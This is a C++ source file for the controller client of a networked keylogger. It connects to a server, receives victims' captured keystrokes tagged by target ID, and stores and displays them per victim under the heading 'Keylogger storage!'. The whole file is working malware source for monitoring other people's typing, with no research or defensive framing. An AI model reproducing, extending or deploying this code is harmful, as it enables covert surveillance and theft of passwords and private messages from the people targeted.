#include "client.h"

client::client(uint64_t (*scrambleFunc)(uint64_t))
    : kq::client_interface<messageType>(scrambleFunc),
      networkingThread(&client::networkInitAndLoop, this), networkLoop(true) {}

client::~client() {
    std::cout << std::format("Disconnecting from server...\n");
    networkLoop = false;

    kq::message<messageType> msg(messageType::clientDisconnected);
    Send(msg);
    Disconnect();
}

void client::print_storage() {
    system("cls");
    std::cout << std::format("Keylogger storage!");
    for (auto& [targetID, keys] : keyMap) {
        std::string targetName = nameMap[targetID];
        std::cout << std::format("\nTarget ID/NAME {{{}/{}}}: ", targetID,
                                 targetName);
        for (auto& key : keys) {
            std::cout << std::format("{}", key);
        }
    }
}

void client::run() { networkingThread.join(); }

void client::networkInitAndLoop() {
    std::cout << std::format("Connecting to server...\n");
    if (!Connect(server_ip, server_port)) {
        std::cout << std::format("Failed connecting to server!\n");
        return;
    }
    while (IsConnected() == false) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << std::format("Successfuly connected to server!\n");
    kq::message<messageType> msg(messageType::clientConnected);
    Send(msg);
    while (networkLoop) {
        if (!Incoming().empty()) {
            auto msg = Incoming().pop_front().msg;
            switch (msg.getID()) {
            case messageType::targetTyped:
                uint32_t targetID;
                msg >> targetID;
                bool caps;
                msg >> caps;
                keyStatus status;
                msg >> status;
                DWORD virtualKey;
                msg >> virtualKey;
                if (status == keyStatus::keyDown) {
                    auto diff = 0;
                    if (std::isalpha(virtualKey) && caps) {
                        diff = 32;
                    }
                    keyMap[targetID].push_back(virtualKey + diff);
                }
                print_storage();
                break;
            case messageType::listOfTargets:
                nameMap.clear();
                uint32_t target_count;
                msg >> target_count;
                for (uint32_t i = 0; i < target_count; i++) {
                    uint32_t targetID;
                    msg >> targetID;
                    uint32_t targetNameSize;
                    msg >> targetNameSize;
                    std::string targetName;
                    for (uint32_t j = 0; j < targetNameSize; j++) {
                        char c;
                        msg >> c;
                        targetName.insert(targetName.begin(), c);
                    }
                    nameMap[targetID] = targetName;
                }
                break;
            default:
                break;
            }
        }
    }
}